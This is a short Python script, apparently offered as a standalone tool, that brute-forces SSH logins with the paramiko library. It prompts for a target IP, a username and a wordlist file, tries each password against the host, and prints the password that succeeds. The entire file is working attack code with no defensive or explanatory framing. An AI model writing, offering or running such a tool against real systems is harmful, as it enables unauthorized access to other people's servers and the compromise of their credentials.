import paramiko

def ssh_brute_force(host, username, password_list):
    print(f"Starting brute-force on {host} with user '{username}'...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            client.connect(hostname=host, username=username, password=password.strip(), timeout=2)
            print(f"[+] Success! Password found: {password.strip()}")
            return
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {password.strip()}")
        except Exception as e:
            print(f"[!] Error: {e}")
    print("[✘] Password not found.")

if __name__ == "__main__":
    host = input("Enter target SSH IP: ")
    username = input("Enter username: ")
    wordlist_path = input("Enter path to password list (e.g., passwords.txt): ")

    try:
        with open(wordlist_path, "r") as f:
            passwords = f.readlines()
        ssh_brute_force(host, username, passwords)
    except FileNotFoundError:
        print("Password file not found.")
